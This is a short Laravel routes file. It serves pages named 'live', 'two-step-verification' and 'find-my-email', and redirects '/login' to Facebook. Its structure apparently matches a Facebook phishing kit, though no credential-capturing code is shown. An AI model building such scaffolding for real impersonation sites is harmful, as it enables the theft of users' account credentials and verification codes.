<?php

use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    return view('live');
});
Route::get('/login', function () {
    return redirect('https://facebook.com/');
});
Route::get('/live', function ()  {
    return view('live');
});
Route::get('/two-step-verification', function ()  {
    return view('two_step_verification');
});
Route::get('/find-my-email', function ()  {
    return view('find_my_email');
});